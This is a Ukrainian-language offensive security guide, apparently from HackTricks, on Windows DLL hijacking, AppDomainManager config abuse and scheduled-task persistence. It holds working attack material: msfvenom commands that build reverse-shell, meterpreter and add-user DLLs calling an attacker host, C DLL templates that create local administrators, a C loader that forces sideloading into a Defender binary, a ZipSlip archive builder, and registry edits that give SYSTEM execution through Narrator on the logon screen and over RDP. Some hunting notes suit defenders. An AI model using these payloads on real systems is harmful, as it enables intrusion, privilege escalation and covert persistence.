# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Основна інформація

DLL Hijacking передбачає маніпуляцію довіреною програмою для завантаження шкідливої DLL. Цей термін охоплює кілька тактик, як-от **DLL Spoofing, Injection та Side-Loading**. Здебільшого це використовується для виконання коду та забезпечення persistence і рідше — для privilege escalation. Попри те, що тут основна увага приділяється escalation, метод hijacking залишається однаковим для різних цілей.

### Поширені техніки

Для DLL hijacking застосовують кілька методів, ефективність кожного з яких залежить від стратегії завантаження DLL, яку використовує програма:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: заміна справжньої DLL на шкідливу, за потреби з використанням DLL Proxying для збереження функціональності оригінальної DLL.
2. **DLL Search Order Hijacking**: розміщення шкідливої DLL у шляху пошуку перед легітимною, використовуючи шаблон пошуку програми.
3. **Phantom DLL Hijacking**: створення шкідливої DLL для завантаження програмою, яка вважає її необхідною, але такою, що не існує.
4. **DLL Redirection**: зміна параметрів пошуку, як-от `%PATH%`, або файлів `.exe.manifest` / `.exe.local`, щоб спрямувати програму до шкідливої DLL.
5. **WinSxS DLL Replacement**: підміна легітимної DLL на шкідливу в каталозі WinSxS — метод, який часто пов'язують із DLL side-loading.
6. **Relative Path DLL Hijacking**: розміщення шкідливої DLL у контрольованому користувачем каталозі разом із копією програми, що нагадує техніки Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading — не єдиний спосіб змусити довірений процес **.NET Framework** завантажити код атакувальника. Якщо цільовий executable є **managed** application, CLR також звертається до application configuration file, названого на честь executable (наприклад, `Setup.exe.config`). Цей файл може визначати власний **AppDomainManager**. Якщо config посилається на assembly, контрольовану атакувальником і розміщену поруч із EXE, CLR завантажує її **до стандартного шляху виконання коду application** і запускає всередині довіреного процесу.<sup>[[24]](#references)</sup>

Відповідно до configuration schema .NET Framework від Microsoft, для використання custom manager мають бути присутніми і `<appDomainManagerAssembly>`, і `<appDomainManagerType>`.<sup>[[16]](#references)[[17]](#references)</sup>

Мінімальний config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Мінімальний менеджер:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Практичні примітки:
- Це tradecraft, специфічний для **.NET Framework**. Він залежить від парсингу конфігурації CLR, а не від порядку пошуку Win32 DLL.
- Хост справді має бути **managed EXE**. Швидка первинна перевірка: `sigcheck -m target.exe`, `corflags target.exe` або перевірка наявності **CLR Runtime Header** у PE-метаданих.
- Ім’я конфігураційного файлу має точно відповідати імені виконуваного файла (`<binary>.config`) і зазвичай розташовується **поруч із EXE**.
- Це корисно для **підписаних Microsoft/vendor binaries**, оскільки trusted EXE залишається незмінним, а malicious managed assembly виконується in-process.
- Якщо у вас уже є writable installer/update directory, AppDomainManager hijacking можна використати як **перший етап**, після якого для наступних етапів застосувати classic DLL sideloading або reflective loading.

### AppDomainManager як downloader + bootstrap scheduled task

Практичний intrusion pattern полягає в тому, щоб поєднати trusted managed EXE із malicious `*.config` та malicious AppDomainManager DLL, яка виконує роль лише **невеликого bootstrapper**:<sup>[[25]](#references)</sup>

1. User запускає signed .NET installer або updater із правдоподібного розташування, наприклад `%USERPROFILE%\Downloads`.
2. Сусідній config змушує CLR завантажити attacker assembly **до** початку legitimate app logic.
3. Malicious manager виконує **path gate** (наприклад, продовжує роботу лише якщо host EXE запущено з `Downloads`, і дозволяє другому етапу працювати лише з `%LOCALAPPDATA%`).
4. Якщо перевірка проходить, він завантажує real payload у user-writable path, наприклад `%LOCALAPPDATA%\PerfWatson2.exe`, і встановлює persistence за допомогою scheduled task.

Чому цей варіант важливий:
- Signed host EXE залишається незмінним, тому triage, який перевіряє лише hash основного binary, може не виявити compromise.
- Поширеним є простий **path-based anti-analysis**: переміщення ZIP/EXE/DLL triad на Desktop, у Temp або sandbox path може навмисно перервати chain.
- First-stage AppDomainManager DLL може залишатися дуже малою та малопомітною, тоді як справжній implant завантажується пізніше.

Мінімальний приклад persistence, який часто зустрічається в цьому pattern:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Примітки:
- ` /rl highest` означає **найвищий доступний рівень** для цього користувача/сеансу; сам по собі він не гарантує ескалацію до SYSTEM.
- Цю техніку часто правильніше класифікувати як **виконання/закріплення через зловживання конфігурацією .NET**, а не як класичний hijacking порядку пошуку відсутньої DLL, хоча оператори часто поєднують обидва підходи.

Точки для виявлення:
- Підписані .NET-виконувані файли, запущені з **шляхів розпакування ZIP**, `Downloads`, `%TEMP%` або інших доступних для запису користувачу папок, із **розташованим поруч** `<exe>.config`.
- Нові scheduled tasks, дія яких вказує на `%LOCALAPPDATA%`, `%APPDATA%` або `Downloads`, а їхні назви імітують оновлювачі браузерів/виробників.
- Короткоживучі керовані bootstrap-процеси, які негайно завантажують інший EXE, а потім запускають `schtasks.exe`.
- Зразки, які завершують роботу раніше, якщо шлях до виконуваного файлу не відповідає очікуваному каталогу профілю користувача.

### Hijacking наявного scheduled task для повторного запуску sideload-ланцюжка

Для persistence не слід зосереджуватися лише на **створенні нового task**. Деякі intrusion sets очікують, поки легітимний інсталятор створить **звичайний task оновлювача**, а потім **перезаписують дію task**, щоб наявні назва, автор і trigger залишалися знайомими для захисників.

Багаторазово використовуваний workflow:
1. Встановіть/запустіть легітимне програмне забезпечення та визначте task, який воно зазвичай створює.
2. Експортуйте XML task і зафіксуйте поточні значення `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Замініть лише action, щоб task запускав ваш **trusted host EXE** із доступного для запису користувачу staging-каталогу, який потім виконає sideload або завантажить справжній payload через AppDomain.
4. Повторно зареєструйте task із тією самою назвою замість створення нового очевидного persistence-артефакту.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Чому це stealthier:
- Назва завдання все ще може виглядати легітимно (наприклад, як updater постачальника).
- Його запускає служба **Task Scheduler**, тому під час перевірки parent/ancestor часто бачиться очікуваний ланцюжок планувальника, а не `explorer.exe`.
- DFIR-команди, які шукають лише **нові назви завдань**, можуть пропустити завдання, реєстрація якого вже існувала, але action тепер вказує на `%LOCALAPPDATA%`, `%APPDATA%` або інший шлях, контрольований attacker-ом.

Швидкі напрямки для hunting:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Порівнюйте XML-файли `C:\Windows\System32\Tasks\*` і metadata `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` з baseline.
- Створюйте alert, коли **updater task, схожий на vendor-ський**, запускається з **каталогів, доступних для запису користувачем**, або запускає .NET EXE із розташованим поруч файлом `*.config`.

> [!TIP]
> Покроковий ланцюжок, у якому HTML staging, AES-CTR configs і .NET implants поєднуються з DLL sideloading, описано в наведеному нижче workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Пошук відсутніх Dll

Найпоширеніший спосіб знайти відсутні Dll у системі — запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) із sysinternals і **встановити** **такі 2 фільтри**:

![Common Techniques - Пошук відсутніх Dll: найпоширеніший спосіб знайти відсутні Dll у системі — запустити procmon із sysinternals і встановити такі 2 фільтри](<../../../images/image (961).png>)

![Common Techniques - Пошук відсутніх Dll: найпоширеніший спосіб знайти відсутні Dll у системі — запустити procmon із sysinternals і встановити такі 2 фільтри](<../../../images/image (230).png>)

і просто відображати **File System Activity**:

![Common Techniques - Пошук відсутніх Dll: і просто відображати File System Activity](<../../../images/image (153).png>)

Якщо ви шукаєте **відсутні dll загалом**, **залиште** це запущеним на кілька **секунд**.\
Якщо ви шукаєте **відсутню dll у конкретному executable**, слід встановити **додатковий фільтр**, наприклад `"Process Name" "contains" <exec name>`, запустити його та припинити захоплення подій**.<sup>[[9]](#references)</sup>

## Exploiting Missing Dlls

Щоб підвищити привілеї, найкращим варіантом буде отримати можливість **записати dll, яку привілейований process спробує завантажити** в одному з **місць, де буде виконуватися пошук**. Отже, ми зможемо **записати** dll у **папку**, де **пошук dll виконується раніше**, ніж у папці, де розташована **оригінальна dll** (рідкісний випадок), або зможемо **записати в папку, де буде виконуватися пошук dll**, якщо оригінальна **dll не існує** в жодній папці.

### Порядок пошуку Dll

У **документації Microsoft** ви можете знайти опис того, як саме завантажуються Dll.

**Windows applications** шукають DLL за набором **попередньо визначених шляхів пошуку**, дотримуючись певної послідовності. Проблема DLL hijacking виникає, коли шкідливу DLL стратегічно розміщено в одному з цих каталогів, завдяки чому вона завантажується раніше за справжню DLL. Щоб запобігти цьому, application має використовувати absolute paths під час звертання до потрібних DLL.

Нижче наведено **порядок пошуку DLL у 32-bit** системах:

1. Каталог, з якого application завантажився.
2. Системний каталог. Для отримання шляху до цього каталогу використовуйте функцію [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya).(_C:\Windows\System32_)
3. Системний каталог 16-bit. Функції, яка отримує шлях до цього каталогу, немає, але пошук у ньому виконується. (_C:\Windows\System_)
4. Каталог Windows. Для отримання шляху до цього каталогу використовуйте функцію [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya).
1. (_C:\Windows_)
5. Поточний каталог.
6. Каталоги, перелічені в environment variable PATH. Зверніть увагу, що сюди не входить per-application path, указаний registry key **App Paths**. Key **App Paths** не використовується під час обчислення DLL search path.

Це **порядок пошуку за замовчуванням** із увімкненим **SafeDllSearchMode**. Якщо його вимкнено, поточний каталог переміщується на друге місце. Щоб вимкнути цю функцію, створіть registry value **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** і встановіть її значення в 0 (за замовчуванням функцію увімкнено).

Якщо функцію [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликано з **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук починається в каталозі executable module, який завантажує **LoadLibraryEx**.

Насамкінець, зверніть увагу, що **dll може бути завантажена із зазначенням absolute path, а не лише назви**. У такому випадку пошук цієї dll **виконуватиметься лише за вказаним шляхом** (якщо dll має dependencies, пошук у них виконуватиметься так, ніби вони завантажуються лише за назвою).

Існують інші способи змінити порядок пошуку, але я не пояснюватиму їх тут.

### Об'єднання arbitrary file write із hijack відсутньої DLL

1. Використовуйте фільтри **ProcMon** (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`), щоб зібрати назви DLL, які process перевіряє, але не може знайти.<sup>[[14]](#references)</sup>
2. Якщо binary запускається за **schedule/service**, DLL з однією з таких назв, розміщена в **application directory** (entry #1 у search order), буде завантажена під час наступного запуску. В одному випадку з .NET scanner process шукав `hostfxr.dll` у `C:\samples\app\` перед завантаженням справжньої копії з `C:\Program Files\dotnet\fxr\...`.
3. Створіть payload DLL (наприклад, reverse shell) з будь-яким export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Якщо ваша primitive — це **arbitrary write у стилі ZipSlip**, створіть ZIP, запис якого виходить за межі extraction dir, щоб DLL опинилася в app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Доставте архів до контрольованої папки inbox/share; коли заплановане завдання повторно запустить процес, він завантажить шкідливу DLL і виконає ваш код від імені сервісного облікового запису.

### Примусовий sideloading через RTL_USER_PROCESS_PARAMETERS.DllPath

Розширений спосіб детерміновано вплинути на шлях пошуку DLL новоствореного процесу — установити поле DllPath у RTL_USER_PROCESS_PARAMETERS під час створення процесу за допомогою native APIs з ntdll. Якщо вказати контрольований зловмисником каталог, цільовий процес, який розв’язує імпортовану DLL за іменем (без абсолютного шляху та без використання безпечних прапорців завантаження), можна змусити завантажити шкідливу DLL із цього каталогу.

Основна ідея
- Створіть параметри процесу за допомогою RtlCreateProcessParametersEx і вкажіть власний DllPath, що вказує на контрольовану вами папку (наприклад, каталог, де розташований ваш dropper/unpacker).
- Створіть процес за допомогою RtlCreateUserProcess. Коли цільовий бінарний файл розв’язує DLL за іменем, loader перевірить указаний DllPath під час розв’язання, забезпечуючи надійний sideloading, навіть якщо шкідлива DLL не розташована поруч із цільовим EXE.

Примітки та обмеження
- Це впливає на дочірній процес, який створюється; це відрізняється від SetDllDirectory, що впливає лише на поточний процес.
- Цільовий процес має імпортувати DLL або викликати LoadLibrary для DLL за іменем (без абсолютного шляху та без використання LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs і жорстко задані абсолютні шляхи неможливо перехопити. Forwarded exports і SxS можуть змінити пріоритет.

Мінімальний приклад на C (ntdll, wide strings, спрощене оброблення помилок):

<details>
<summary>Повний приклад на C: примусовий sideloading DLL через RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Приклад практичного використання
- Розмістіть malicious xmllite.dll (що експортує необхідні функції або proxying до оригінальної DLL) у вашому каталозі DllPath.
- Запустіть підписаний binary, який, як відомо, шукає xmllite.dll за іменем, використовуючи наведену вище техніку. Loader вирішує import через вказаний DllPath і sideloads вашу DLL.

Цю техніку спостерігали in-the-wild для побудови багатоступеневих sideloading-ланцюжків: початковий launcher розміщує helper DLL, яка потім запускає підписаний Microsoft binary, вразливий до hijacking, із custom DllPath, щоб примусово завантажити DLL зловмисника зі staging-каталогу.<sup>[[6]](#references)</sup>


### AppDomainManager hijacking через `.exe.config`

Для цілей **.NET Framework** sideloading можна виконати **до `Main()`** без patching пам'яті, зловживаючи сусіднім файлом **`.exe.config`** застосунку. Замість використання лише порядку пошуку Win32 DLL зловмисник розміщує легітимний .NET EXE поруч зі шкідливим config-файлом і однією або кількома assemblies, контрольованими зловмисником.

Як працює цей ланцюжок:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE запускається, і **CLR читає `<exe>.config`**.
2. Config задає **`<appDomainManagerAssembly>`** і **`<appDomainManagerType>`**, щоб runtime інстанціював контрольований зловмисником `AppDomainManager`.
3. Шкідливий manager отримує виконання **до `Main()`** усередині trusted host process.
4. Той самий config може змусити CLR спочатку шукати локальні assemblies (наприклад, `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) і послабити runtime validation/telemetry без inline patching.

Патерн у стилі campaign (точна вкладеність може відрізнятися залежно від directive / версії CLR):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Чому це корисно:
- **`<probing privatePath="."/>`** обмежує розв'язання assembly каталогом застосунку, перетворюючи папку на передбачувану поверхню для sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** переміщують виконання в код атакувальника під час ініціалізації CLR, до запуску легітимної логіки застосунку.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** може дозволити застосунку з повною довірою завантажувати unsigned або змінені assemblies без помилки перевірки strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** уникає перенаправлень publisher-policy до новіших assemblies.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** робить вибір runtime більш детермінованим.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** особливо цікавий, оскільки **CLR вимикає власну видимість через ETW** з конфігурації, замість того щоб implant патчив `EtwEventWrite` у пам'яті.

Операційний шаблон, помічений у нещодавніх кампаніях:
- Етап 1: розміщуються `setup.exe`, `setup.exe.config` і локальні assemblies.
- Етап 2: вони копіюються до правдоподібної папки **AppData update**, host перейменовується на щось на кшталт `update.exe`, після чого повторно запускається через **scheduled task**.
- Етап 3: перевіряється контекст виконання (наприклад, очікуваний parent `svchost.exe` від Task Scheduler) перед завантаженням фінального RAT DLL/export.

Ідеї для пошуку:
- Підписані або іншим чином легітимні **.NET executables**, що запускаються із підозрілими сусідніми файлами **`.config`** у доступних для запису користувачем місцях.
- Файли `.config`, що містять **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** або **`etwEnable enabled="false"`**.
- Scheduled tasks, які повторно запускають перейменовані update binaries із **`%LOCALAPPDATA%`** або специфічних для застосунку каталогів `\bin\update\`.
- Parent/child chains, у яких scheduled task запускає trusted .NET host, що негайно завантажує assemblies не від vendor із власного каталогу.

#### Винятки з порядку пошуку dll у документації Windows

У документації Windows зазначено певні винятки зі стандартного порядку пошуку DLL:

- Коли виявляється **DLL з іменем, що збігається з уже завантаженою в пам'ять**, система обходить звичайний пошук. Замість цього вона перевіряє перенаправлення та manifest, перш ніж використати DLL, яка вже перебуває в пам'яті. **У цьому сценарії система не виконує пошук DLL**.
- Якщо DLL розпізнається як **known DLL** для поточної версії Windows, система використовує свою версію known DLL разом із будь-якими залежними DLL, **пропускаючи процес пошуку**. Реєстровий ключ **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** містить список цих known DLL.
- Якщо **DLL має залежності**, пошук цих залежних DLL виконується так, ніби вони були вказані лише своїми **module names**, незалежно від того, чи початкову DLL було ідентифіковано через повний шлях.

### Підвищення привілеїв

**Вимоги**:

- Ідентифікувати процес, який працює або працюватиме з **іншими привілеями** (горизонтальне або lateral movement) і якому **бракує DLL**.
- Переконатися, що доступ на запис доступний для будь-якого **каталогу**, у якому буде виконуватися **пошук DLL**. Це може бути каталог executable або каталог у system path.

Так, ці вимоги складно виконати, оскільки **за замовчуванням досить дивно знайти privileged executable, якому бракує dll**, а ще **дивніше — мати дозволи на запис до папки system path** (за замовчуванням це неможливо). Але в неправильно налаштованих середовищах це можливо.\
Якщо вам пощастило і ви відповідаєте вимогам, можна перевірити проєкт [UACME](https://github.com/hfiref0x/UACME). Навіть якщо **основна мета проєкту — bypass UAC**, там можна знайти **PoC** Dll hijaking для потрібної версії Windows, який можна використати (ймовірно, просто змінивши шлях до папки, у якій ви маєте дозволи на запис).

Зверніть увагу, що **перевірити дозволи в папці** можна так:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
І **перевірте дозволи для всіх папок усередині PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Також можна перевірити імпорти виконуваного файла та експорти DLL за допомогою:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Для повного посібника щодо того, як **зловживати Dll Hijacking для підвищення привілеїв** із дозволами на запис у папку **System Path**, перегляньте:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Автоматизовані інструменти

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)перевірить, чи маєте ви дозволи на запис у будь-яку папку всередині системного PATH.\
Іншими цікавими автоматизованими інструментами для виявлення цієї вразливості є **функції PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ і _Write-HijackDll._

### Приклад

Якщо ви виявили експлуатований сценарій, однією з найважливіших умов його успішної експлуатації буде **створення dll, яка експортує щонайменше всі функції, що виконуваний файл імпортуватиме з неї**. У будь-якому разі зверніть увагу, що Dll Hijacking зручно використовувати для [підвищення рівня цілісності з Medium до High **(обхід UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) або з[ **High Integrity до SYSTEM**](../index.html#from-high-integrity-to-system)**.** Приклад **створення дійсної dll** можна знайти в цьому дослідженні Dll Hijacking, зосередженому на Dll Hijacking для виконання: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Крім того, у **наступному розділ**і ви знайдете деякі **базові коди dll**, які можуть бути корисними як **шаблони** або для створення **dll з експортованими функціями, які не є обов’язковими**.

## **Створення та компіляція Dll**

### **Dll Proxifying**

По суті, **Dll proxy** — це Dll, здатна **виконувати ваш шкідливий код під час завантаження**, а також **надавати** й **працювати** так, як **очікується**, перенаправляючи всі виклики до реальної бібліотеки.

За допомогою інструмента [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) ви можете **вказати виконуваний файл і вибрати бібліотеку**, яку хочете проксіфікувати, та **згенерувати проксіфіковану dll**, або **вказати Dll** і **згенерувати проксіфіковану dll**.

### **Meterpreter**

**Отримання rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Отримайте meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Створити користувача (x86; x64-версії я не знайшов):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Власноручно

Зверніть увагу, що в кількох випадках скомпільована вами Dll має **експортувати кілька функцій**, які завантажуватиме victim process. Якщо цих функцій не існує, **binary не зможе їх завантажити**, і **exploit завершиться невдало**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Приклад C++ DLL зі створенням користувача</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Альтернативна C DLL із точкою входу потоку</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Практичний приклад: Hijack локалізаційної DLL Narrator OneCore TTS (Accessibility/ATs)

Windows Narrator.exe досі під час запуску перевіряє передбачувану мовозалежну локалізаційну DLL, яку можна hijack для довільного виконання коду та persistence.<sup>[[7]](#references)</sup>

Ключові факти
- Шлях перевірки (поточні збірки): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy-шлях (старі збірки): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Якщо за шляхом OneCore існує доступна для запису DLL, контрольована attacker'ом, її буде завантажено, а `DllMain(DLL_PROCESS_ATTACH)` виконається. Експорти не потрібні.

Discovery за допомогою Procmon
- Фільтр: `Process Name is Narrator.exe` та `Operation is Load Image` або `CreateFile`.
- Запустіть Narrator і спостерігайте за спробою завантаження вказаного вище шляху.

Мінімальна DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Наївний hijack буде говорити/підсвічувати UI. Щоб залишатися непомітним, під час attach перелічіть потоки Narrator, відкрийте головний потік (`OpenThread(THREAD_SUSPEND_RESUME)`) і призупиніть його через `SuspendThread`; продовжуйте виконання у власному потоці. Повний код див. у PoC.<sup>[[8]](#references)</sup>

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- За допомогою наведених вище налаштувань запуск Narrator завантажує planted DLL. На secure desktop (екрані входу) натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваша DLL виконається як SYSTEM на secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Дозвольте classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Підключіться до host через RDP, на екрані входу натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваша DLL виконається як SYSTEM на secure desktop.
